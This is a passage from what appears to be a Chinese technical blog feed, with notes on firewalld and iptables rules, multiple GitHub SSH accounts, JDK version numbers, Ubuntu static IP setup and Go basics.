class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[root@localhost tmp]# firewall-cmd --query-service ftp<br>no<br>[root@localhost tmp]# firewall-cmd --add-service=ftp<br><span class="hljs-keyword">success</span><br><span class="hljs-keyword"></span>[root@localhost tmp]# firewall-cmd --query-service ftp<br>yes<br></code></pre></td></tr></table></figure><h4 id="永久开启服务"><a href="#永久开启服务" class="headerlink" title="永久开启服务"></a>永久开启服务</h4><h5 id="firewall-cmd-–add-service-servicename-–permanent"><a href="#firewall-cmd-–add-service-servicename-–permanent" class="headerlink" title="firewall-cmd –add-service&#x3D;servicename –permanent"></a><strong>firewall-cmd –add-service&#x3D;servicename –permanent</strong></h5><p>firewall-cmd –add-service&#x3D;ftp –permanent     ##永久开放ftp服务</p><h4 id="永久添加端口"><a href="#永久添加端口" class="headerlink" title="永久添加端口"></a>永久添加端口</h4><h5 id="firewall-cmd-–add-port-80-tcp-–permanent"><a href="#firewall-cmd-–add-port-80-tcp-–permanent" class="headerlink" title="firewall-cmd –add-port&#x3D;80&#x2F;tcp –permanent"></a><strong>firewall-cmd –add-port&#x3D;80&#x2F;tcp –permanent</strong></h5><h4 id="查看防火墙规则"><a href="#查看防火墙规则" class="headerlink" title="查看防火墙规则"></a>查看防火墙规则</h4><h5 id="iptables-nL"><a href="#iptables-nL" class="headerlink" title="iptables -nL"></a>iptables -nL</h5><h4 id="清除防火墙规则"><a href="#清除防火墙规则" class="headerlink" title="清除防火墙规则"></a>清除防火墙规则</h4><h5 id="iptables-F"><a href="#iptables-F" class="headerlink" title="iptables -F"></a>iptables -F</h5><h4 id="删除防火墙策略"><a href="#删除防火墙策略" class="headerlink" title="删除防火墙策略"></a>删除防火墙策略</h4><p>–remove-rich-rule 参数</p><p>firewall-cmd –permanent –remove-rich-rule&#x3D;”rule family&#x3D;”ipv4” port protocol&#x3D;”tcp” port&#x3D;”3306” reject”</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">(base) [root@nvm-17fuhy3puyhy0 /]# firewall-cmd --permanent <span class="hljs-attribute">--remove-rich-rule</span>=<span class="hljs-string">&quot;rule family=&quot;</span>ipv4&quot;<span class="hljs-built_in"> port </span><span class="hljs-attribute">protocol</span>=<span class="hljs-string">&quot;tcp&quot;</span> <span class="hljs-attribute">port</span>=<span class="hljs-string">&quot;3306&quot;</span> reject<span class="hljs-string">&quot;</span><br><span class="hljs-string">success</span><br></code></pre></td></tr></table></figure><h4 id="查看防火墙版本"><a href="#查看防火墙版本" class="headerlink" title="查看防火墙版本"></a>查看防火墙版本</h4><h5 id="firewall-cmd-–version（必须在防火墙启动的情况下才有结果）"><a href="#firewall-cmd-–version（必须在防火墙启动的情况下才有结果）" class="headerlink" title="firewall-cmd –version（必须在防火墙启动的情况下才有结果）"></a><strong>firewall-cmd –version</strong>（必须在防火墙启动的情况下才有结果）</h5><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">┌──(root㉿kali2022-appsec)-<span class="hljs-selector-attr">[~]</span><br>└─# firewall-cmd <span class="hljs-attr">--version</span><br><span class="hljs-number">1.1</span><span class="hljs-selector-class">.1</span><br></code></pre></td></tr></table></figure><h4 id="防火墙策略文件位置"><a href="#防火墙策略文件位置" class="headerlink" title="防火墙策略文件位置"></a>防火墙策略文件位置</h4><h5 id="etc-firewalld-zones"><a href="#etc-firewalld-zones" class="headerlink" title="&#x2F;etc&#x2F;firewalld&#x2F;zones"></a><strong>&#x2F;etc&#x2F;firewalld&#x2F;zones</strong></h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml">(base) [root@110 ~]# cat /etc/firewalld/zones/public.xml<br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">zone</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">short</span>&gt;</span>Public<span class="hljs-tag">&lt;/<span class="hljs-name">short</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span>For use in public areas. You do not trust the other computers on networks to not harm your computer. Only selected incoming connections are accepted.<span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">service</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ssh&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">service</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;dhcpv6-client&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">rule</span> <span class="hljs-attr">family</span>=<span class="hljs-string">&quot;ipv4&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">address</span>=<span class="hljs-string">&quot;0.0.0.0/0&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">port</span> <span class="hljs-attr">protocol</span>=<span class="hljs-string">&quot;tcp&quot;</span> <span class="hljs-attr">port</span>=<span class="hljs-string">&quot;21&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">reject</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">rule</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">zone</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="设置IP和端口策略"><a href="#设置IP和端口策略" class="headerlink" title="设置IP和端口策略"></a>设置IP和端口策略</h4><h5 id="禁止"><a href="#禁止" class="headerlink" title="禁止"></a>禁止</h5><p>firewall-cmd –permanent –add-rich-rule&#x3D;”rule family&#x3D;”ipv4” source address&#x3D;”172.26.208.22” port protocol&#x3D;”tcp” port&#x3D;”11” reject”</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">┌──(root㉿kali2022-appsec)-[~]<br>└─# firewall-cmd --permanent <span class="hljs-attribute">--add-rich-rule</span>=<span class="hljs-string">&quot;rule family=&quot;</span>ipv4&quot; source <span class="hljs-attribute">address</span>=<span class="hljs-string">&quot;172.26.208.22&quot;</span><span class="hljs-built_in"> port </span><span class="hljs-attribute">protocol</span>=<span class="hljs-string">&quot;tcp&quot;</span> <span class="hljs-attribute">port</span>=<span class="hljs-string">&quot;11&quot;</span> reject<span class="hljs-string">&quot;</span><br><span class="hljs-string">success</span><br></code></pre></td></tr></table></figure><h5 id="允许"><a href="#允许" class="headerlink" title="允许"></a>允许</h5><p>firewall-cmd –permanent –add-rich-rule&#x3D;”rule family&#x3D;”ipv4” source address&#x3D;”10.222.28.0&#x2F;24” port protocol&#x3D;”tcp” port&#x3D;”3390” accept”</p><p>sudo firewall-cmd –zone&#x3D;public –add-rich-rule&#x3D;’rule family&#x3D;”ipv4” source address&#x3D;”1.1.1.1” port protocol&#x3D;”tcp” port&#x3D;”3306” accept’</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">┌──(root㉿kali2022-appsec)-[~]<br>└─# firewall-cmd --permanent <span class="hljs-attribute">--add-rich-rule</span>=<span class="hljs-string">&quot;rule family=&quot;</span>ipv4&quot; source <span class="hljs-attribute">address</span>=<span class="hljs-string">&quot;10.222.28.0/24&quot;</span><span class="hljs-built_in"> port </span><span class="hljs-attribute">protocol</span>=<span class="hljs-string">&quot;tcp&quot;</span><br><span class="hljs-attribute">port</span>=<span class="hljs-string">&quot;3390&quot;</span> accept<span class="hljs-string">&quot;</span><br><span class="hljs-string">success</span><br></code></pre></td></tr></table></figure><h5 id="网段允许"><a href="#网段允许" class="headerlink" title="网段允许"></a>网段允许</h5><p>firewall-cmd –permanent –add-rich-rule&#x3D;”rule family&#x3D;”ipv4” source address&#x3D;”10.222.28.0&#x2F;24” port protocol&#x3D;”tcp” port&#x3D;”80” accept”</p><h5 id="端口段允许"><a href="#端口段允许" class="headerlink" title="端口段允许"></a>端口段允许</h5><p>firewall-cmd –permanent –add-rich-rule&#x3D;”rule family&#x3D;”ipv4” port protocol&#x3D;”tcp” port&#x3D;”50000-60000” accept”</p><h3 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h3><h4 id="安装防火墙"><a href="#安装防火墙" class="headerlink" title="安装防火墙"></a>安装防火墙</h4><p>yum -y install iptables-services</p><h5 id="增加规则"><a href="#增加规则" class="headerlink" title="增加规则"></a>增加规则</h5><p>如果要修改防火墙配置，如增加防火墙端口3306</p><p>vim &#x2F;etc&#x2F;sysconfig&#x2F;iptables </p><p>-A INPUT -m state –state NEW -m tcp -p tcp –dport 3306 -j ACCEPT</p><p>保存退出后</p><p>systemctl restart iptables.service #重启防火墙使配置生效</p><p>systemctl enable iptables.service #设置防火墙开机启动</p><p>最后重启系统使设置生效即可。</p><p>增加防火墙</p><p>[root@localhost opt]# iptables -A INPUT -p tcp –dport 80 -j ACCEPT<br>[root@localhost opt]# service iptables status<br>Table: filter<br>Chain INPUT (policy ACCEPT)<br>num  target     prot opt source               destination<br>1    ACCEPT     tcp  –  0.0.0.0&#x2F;0            0.0.0.0&#x2F;0           tcp dpt:80 </p><p>Chain FORWARD (policy ACCEPT)<br>num  target     prot opt source               destination         </p><p>Chain OUTPUT (policy ACCEPT)<br>num  target     prot opt source               destination         </p><p>删除防火墙</p><p>iptables -D INPUT [NUM]</p><p>允许IP段</p><p>iptables -A INPUT -s 10.222.28.0&#x2F;24 -p tcp –dport 3390 -j ACCEPT</p><p>iptables -I INPUT -s 172.16.153.57 -p tcp –dport 80 -j ACCEPT</p><p>172.16.234.56</p><p>iptables -A INPUT -p tcp –dport 80 -j DROP</p><p>1.开放80，22，8080 端口</p><p>&#x2F;sbin&#x2F;iptables -I INPUT -p tcp –dport 80 -j ACCEPT</p><p>&#x2F;sbin&#x2F;iptables -I INPUT -p tcp –dport 22 -j ACCEPT</p><p>&#x2F;sbin&#x2F;iptables -I INPUT -p tcp –dport 8080 -j ACCEPT</p><p>2.保存</p><p>&#x2F;etc&#x2F;rc.d&#x2F;init.d&#x2F;iptables save</p><p>3.查看打开的端口</p><p>&#x2F;etc&#x2F;init.d&#x2F;iptables status</p><p>4.关闭防火墙 </p><p>1） 永久性生效，重启后不会复原</p><p>开启： chkconfig iptables on</p><p>关闭： chkconfig iptables off</p><p>2） 即时生效，重启后复原</p><p>开启： service iptables start</p><p>关闭： service iptables stop</p><h2 id="Kali"><a href="#Kali" class="headerlink" title="Kali"></a>Kali</h2><h3 id="安装-ufw"><a href="#安装-ufw" class="headerlink" title="安装 ufw"></a>安装 ufw</h3><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">apt <span class="hljs-keyword">install</span> ufw<br></code></pre></td></tr></table></figure><h3 id="查看防火墙状态-ufw-status"><a href="#查看防火墙状态-ufw-status" class="headerlink" title="查看防火墙状态 ufw status"></a>查看防火墙状态 ufw status</h3><h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><p>阻止的策略优先于允许的策略</p><p><a href="https://blog.csdn.net/lql971203/article/details/84450960">https://blog.csdn.net/lql971203/article/details/84450960</a></p><p><a href="https://blog.csdn.net/lql971203/article/details/84451028">https://blog.csdn.net/lql971203/article/details/84451028</a></p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>application</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>application</tag>
      
      <tag>firewalld</tag>
      
      <tag>iptables</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>git_tips</title>
    <link href="/2024/03/15/yunwei/applications/git/git_tips/"/>
    <url>/2024/03/15/yunwei/applications/git/git_tips/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="配置多个账号"><a href="#配置多个账号" class="headerlink" title="配置多个账号"></a>配置多个账号</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>mac 电脑配置多个github账号 ssh</p><h2 id="操作过程"><a href="#操作过程" class="headerlink" title="操作过程"></a>操作过程</h2><h3 id="生成不同账号密钥"><a href="#生成不同账号密钥" class="headerlink" title="生成不同账号密钥"></a>生成不同账号密钥</h3><p>ssh-keygen -t rsa -C “github登录邮箱” -f ~&#x2F;.ssh&#x2F;id_rsa_密钥名称，生成不同账号的密钥，只需要修改 “github登录邮箱”和“密钥名称”即可</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">ssh-keygen -t rsa -C <span class="hljs-string">&quot;pr0t0n119@proton.me&quot;</span> -f ~<span class="hljs-regexp">/.ssh/id</span>_rsa_moss119<br></code></pre></td></tr></table></figure><p>会生成私钥 id_rsa_密钥名称、公钥 id_rsa_密钥名称_pub</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">➜  .ssh ssh-keygen -t rsa -C <span class="hljs-string">&quot;pr0t0n119@proton.me&quot;</span> -f ~/.ssh/id_rsa_moss119<br>Generating public/private rsa key pair.<br>Enter passphrase (empty for no passphrase): <br>Enter same passphrase again: <br>Your identification has been saved in /Users/admin/.ssh/id_rsa_moss119<br>Your public key has been saved in /Users/admin/.ssh/id_rsa_moss119.pub<br>The key fingerprint is:<br>SHA256:OgJRf1mQeTWUV+aBbqmaEHcX++qtnONdan/JBzzrIeg pr0t0n119<span class="hljs-meta">@proton.me</span><br>The key&#x27;s randomart image is:<br>+---[RSA 3072]----+<br>|<span class="hljs-string">    .   .+.o+..oo</span>|<br>|<span class="hljs-string">   . .  oo. .+.o.</span>|<br>|<span class="hljs-string">  .   . o.  ..+ .</span>|<br>|<span class="hljs-string">   .   o . . *   </span>|<br>|<span class="hljs-string">  .     S . +..  </span>|<br>|<span class="hljs-string">   .   o   o  +. </span>|<br>|<span class="hljs-string">    . o . + . ++o</span>|<br>|<span class="hljs-string">     . . +  .+*=+</span>|<br>|<span class="hljs-string">          E oO=++</span>|<br>+----[SHA256]-----+<br></code></pre></td></tr></table></figure><h3 id="公钥写入对应GitHub"><a href="#公钥写入对应GitHub" class="headerlink" title="公钥写入对应GitHub"></a>公钥写入对应GitHub</h3><p>配置链接，账号settings-&gt;SSH and GPG keys-&gt;SSH keys-&gt;New SSH Key</p><p><a href="https://github.com/settings/keys">https://github.com/settings/keys</a></p><p>title：可以随意填写</p><p>Key type：默认 Authentication Key</p><p>Key：公钥 id_rsa_密钥名称_pub的内容</p><h3 id="配置-ssh-config-文件"><a href="#配置-ssh-config-文件" class="headerlink" title="配置 ssh config 文件"></a>配置 ssh config 文件</h3><h4 id="文件位置"><a href="#文件位置" class="headerlink" title="文件位置"></a>文件位置</h4><p>~&#x2F;.ssh&#x2F;config</p><h4 id="配置文件添加内容"><a href="#配置文件添加内容" class="headerlink" title="配置文件添加内容"></a>配置文件添加内容</h4><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">Host moss119github.com<br>  HostName github.com<br>  <span class="hljs-keyword">User</span> <span class="hljs-title">git</span><br>  IdentityFile ~/.ssh/id_rsa_moss119<br>  PreferredAuthentications publickey<br></code></pre></td></tr></table></figure><p>Host：HostName 的别名</p><p>HostName：GitHub 的主机名为 “github.com”</p><p>User：设置为 “git”，是 GitHub 上 SSH 连接的默认用户名</p><p>IdentityFile： 指定 GitHub 身份验证密钥文件的路径。如果 GitHub 密钥不是默认的 <code>~/.ssh/id_rsa</code>，则需要指定正确的路径。例如，密钥文件名为 <code>id_rsa_moss119</code>，则将其路径设置为 <code>~/.ssh/id_rsa_moss119</code>。</p><h3 id="验证SSH登录"><a href="#验证SSH登录" class="headerlink" title="验证SSH登录"></a>验证SSH登录</h3><p>ssh -T 别名</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">➜  moss119<span class="hljs-selector-class">.github</span><span class="hljs-selector-class">.io</span> git:(main) ssh -T moss119github<span class="hljs-selector-class">.com</span><br>Hi moss119! You<span class="hljs-string">&#x27;ve successfully authenticated, but GitHub does not provide shell access.</span><br></code></pre></td></tr></table></figure><h2 id="错误解决"><a href="#错误解决" class="headerlink" title="错误解决"></a>错误解决</h2><h3 id="Permission-denied"><a href="#Permission-denied" class="headerlink" title="Permission denied"></a>Permission denied</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">➜  moss119<span class="hljs-selector-class">.github</span><span class="hljs-selector-class">.io</span> git:(main) ssh -T moss119github<span class="hljs-selector-class">.com</span>     <br>admin@github<span class="hljs-selector-class">.com</span>: Permission denied (publickey).<br></code></pre></td></tr></table></figure><p>ssh config 没有设置用户名且命令中没有指定用户，会使用当前设备登录的用户名进行登录验证，肯定会报错</p><p>解决方案</p><p>ssh config 中设置用户：User git</p><p>或</p><p>命令中指定用户 ：<a href="mailto:&#x67;&#x69;&#x74;&#64;&#109;&#x6f;&#x73;&#115;&#49;&#x31;&#x39;&#103;&#105;&#116;&#x68;&#x75;&#98;&#x2e;&#x63;&#111;&#x6d;">&#x67;&#x69;&#x74;&#64;&#109;&#x6f;&#x73;&#115;&#49;&#x31;&#x39;&#103;&#105;&#116;&#x68;&#x75;&#98;&#x2e;&#x63;&#111;&#x6d;</a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.quafoo.net/posts/Add-Multi-Github-Account-On-Same-Mac/">https://www.quafoo.net/posts/Add-Multi-Github-Account-On-Same-Mac/</a></p><h1 id="SSH拉取代码"><a href="#SSH拉取代码" class="headerlink" title="SSH拉取代码"></a>SSH拉取代码</h1><ol><li><p>在本地生成 SSH key，命令为 <code>ssh-keygen -t rsa -C &quot;xxxxx@xxxxx.com&quot;</code>，这里的 <code>xxxxx@xxxxx.com</code> 是你的邮箱地址，并不要求与特定的邮箱地址匹配。</p></li><li><p>把公钥放到 GitHub 上。在本地找到 id_rsa.pub 文件，复制里面的内容。然后回到 GitHub，进入自己的设置（Settings）页面，在 “SSH and GPG keys” 下点击 “New SSH key”，在 Key 框里粘贴刚才复制的公钥内容，然后点击 “Add key”。</p></li><li><p>测试代码是否推拉正常。在本地找个文件夹打开 Git Bash，输入 <code>git clone &lt;你的仓库SSH地址&gt;</code>，然后会瞬间拉取成功，SSH 配置就完成了。</p><p>仓库SSH地址需要注意，如果本地 ~&#x2F;.ssh&#x2F;config 文件中有配置特定的HOST，需要和配置的相同</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Host ncgithub<span class="hljs-selector-class">.com</span><br>  HostName github<span class="hljs-selector-class">.com</span><br>  IdentityFile ~/.ssh/id_rsa_nc<br>  PreferredAuthentications publickey<br></code></pre></td></tr></table></figure><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">原始：<br>git <span class="hljs-keyword">clone</span> <span class="hljs-title">git</span>@github.com:C0isini/studynote.git<br><br>修改后：<br><br><br>git <span class="hljs-keyword">clone</span> <span class="hljs-title">git</span>@ncgithub.com:C0isini/studynote.git<br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>application</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>application</tag>
      
      <tag>git</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>jdk_version</title>
    <link href="/2024/03/15/yunwei/applications/java/jdk_version/"/>
    <url>/2024/03/15/yunwei/applications/java/jdk_version/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><table><thead><tr><th align="center"></th><th align="center"></th><th align="center"></th></tr></thead><tbody><tr><td align="center">JDK版本</td><td align="center">major.minor version</td><td align="center">十六进制表示</td></tr><tr><td align="center">1.1</td><td align="center">45</td><td align="center">0x2D hex</td></tr><tr><td align="center">1.2</td><td align="center">46</td><td align="center">0x2E hex</td></tr><tr><td align="center">1.3</td><td align="center">47</td><td align="center">0x2F hex</td></tr><tr><td align="center">1.4</td><td align="center">48</td><td align="center">0x30 hex</td></tr><tr><td align="center">1.5</td><td align="center">49</td><td align="center">0x31 hex</td></tr><tr><td align="center">1.6</td><td align="center"><em><strong>50</strong></em></td><td align="center">0x32 hex</td></tr><tr><td align="center">1.7</td><td align="center">51</td><td align="center">0x33 hex</td></tr><tr><td align="center">Java8</td><td align="center">52</td><td align="center">0x34 hex</td></tr><tr><td align="center">Java9</td><td align="center">53</td><td align="center"></td></tr><tr><td align="center">Java10</td><td align="center">54</td><td align="center"></td></tr><tr><td align="center">Java11</td><td align="center">55</td><td align="center"></td></tr><tr><td align="center">Java12</td><td align="center">56</td><td align="center"></td></tr><tr><td align="center">Java13</td><td align="center">57</td><td align="center"></td></tr><tr><td align="center">Java14</td><td align="center">58</td><td align="center"></td></tr><tr><td align="center">Java15</td><td align="center">59</td><td align="center"></td></tr><tr><td align="center">Java16</td><td align="center">60</td><td align="center"></td></tr><tr><td align="center">Java17</td><td align="center">61</td><td align="center"></td></tr><tr><td align="center">Java18</td><td align="center">62</td><td align="center"></td></tr><tr><td align="center">这里只需要记住JDK11的版本号是55,以此为基准上下加减进行即可!</td><td align="center"></td><td align="center"></td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>application</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>application</tag>
      
      <tag>jdk</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ubuntu_static_ip</title>
    <link href="/2024/03/14/network/ip/ubuntu_static_ip/"/>
    <url>/2024/03/14/network/ip/ubuntu_static_ip/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>Ubuntu20.4</p><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><p>1、备份 &#x2F;etc&#x2F;netplan 下配置文件</p><p>cp &#x2F;etc&#x2F;netplan&#x2F;01-network-manager-all.yaml &#x2F;etc&#x2F;netplan&#x2F;01-network-manager-all.yaml.bak</p><p>2、修改 &#x2F;etc&#x2F;netplan 下配置文件</p><p>yaml 文件，需要注意空格缩进</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># Let NetworkManager manage all devices on this system</span><br><span class="hljs-attr">network:</span><br>  <span class="hljs-attr">version:</span> <span class="hljs-number">2</span><br>  <span class="hljs-attr">renderer:</span> <span class="hljs-string">NetworkManager</span><br>  <span class="hljs-attr">ethernets:</span><br>    <span class="hljs-attr">ens33:</span><br>      <span class="hljs-attr">dhcp4:</span> <span class="hljs-literal">false</span><br>      <span class="hljs-attr">addresses:</span> <br>          <span class="hljs-bullet">-</span> <span class="hljs-number">192.168</span><span class="hljs-number">.3</span><span class="hljs-number">.223</span><span class="hljs-string">/24</span><br>      <span class="hljs-attr">routes:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-attr">to:</span> <span class="hljs-string">default</span><br>            <span class="hljs-attr">via:</span> <span class="hljs-number">192.168</span><span class="hljs-number">.3</span><span class="hljs-number">.1</span><br><span class="hljs-string">ubuntu@ubuntu-virtual-machine:/</span><br></code></pre></td></tr></table></figure><p>3、应用当前配置</p><p>sudo netplan apply</p><h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h2><h3 id="配置后没有网络"><a href="#配置后没有网络" class="headerlink" title="配置后没有网络"></a>配置后没有网络</h3><h4 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h4><p>ip  a  对应网卡没有IP信息</p><p>图形界面也没有网络信息，右上角开关按钮-&gt;Settings-&gt;Network 只有 VPN 和 Network Proxy ，没有 Wired</p><h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h4><p>停止网络服务，删除缓存信息，启动网络服务</p><p>service NetworkManager stop</p><p>rm -rf &#x2F;var&#x2F;lib&#x2F;NetworkManager&#x2F;NetworkManager.state</p><p>service NetworkManager start </p>]]></content>
    
    
    <categories>
      
      <category>network</category>
      
      <category>ip</category>
      
    </categories>
    
    
    <tags>
      
      <tag>network</tag>
      
      <tag>ubuntu</tag>
      
      <tag>ip</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>golang_base</title>
    <link href="/2024/03/14/dev/golang/golang_base/"/>
    <url>/2024/03/14/dev/golang/golang_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="语言结构"><a href="#语言结构" class="headerlink" title="语言结构"></a>语言结构</h2><h3 id="基础组成"><a href="#基础组成" class="headerlink" title="基础组成"></a>基础组成</h3><h4 id="包声明"><a href="#包声明" class="headerlink" title="包声明"></a>包声明</h4><p>必须在非注释的第一行表明文件属于哪个包，例如：package main</p><p>package main 表示该文件是可独立执行的程序，每个Go应用程序都包含一个名为 main 的包</p><h4 id="引入包"><a href="#引入包" class="headerlink" title="引入包"></a>引入包</h4><p>import “包名”</p><p>import “fmt”，告诉程序需要使用 fmt 包，fmt 包实现了格式化IO（输入&#x2F;输出）的函数</p><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><p>func 函数名()</p><p>func main()</p><p>main 函数是每个可执行程序必须包含的，也是一般情况下程序启动后第一个执行的函数（如果程序中包含 init 函数，将会先执行 init 函数）</p><p>函数体的左大括号必须和函数名在同行，不可换行在另一行或者单独成行，</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">//this is first demo code</span><br>fmt.Println(<span class="hljs-string">&quot;this is main func&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;this is init func&quot;</span>)<br>&#125;<br><br><br>➜  gocode <span class="hljs-keyword">go</span> run hello.<span class="hljs-keyword">go</span><br>this is init <span class="hljs-function"><span class="hljs-keyword">func</span></span><br>this is main <span class="hljs-function"><span class="hljs-keyword">func</span></span><br></code></pre></td></tr></table></figure><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><h4 id="语句-表达式"><a href="#语句-表达式" class="headerlink" title="语句&amp;表达式"></a>语句&amp;表达式</h4><h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h4><p>单行注释：“\”的行</p><p>多行注释，块注释，不可嵌套使用</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-comment">/* 开头</span><br><span class="hljs-comment">*/</span> 结尾<br></code></pre></td></tr></table></figure><h2 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h2><h3 id="标记"><a href="#标记" class="headerlink" title="标记"></a>标记</h3><p>GO程序可以由多个标记构成，标记可以是关键词、标识符、常量、字符串、符号等</p><h3 id="行分隔符"><a href="#行分隔符" 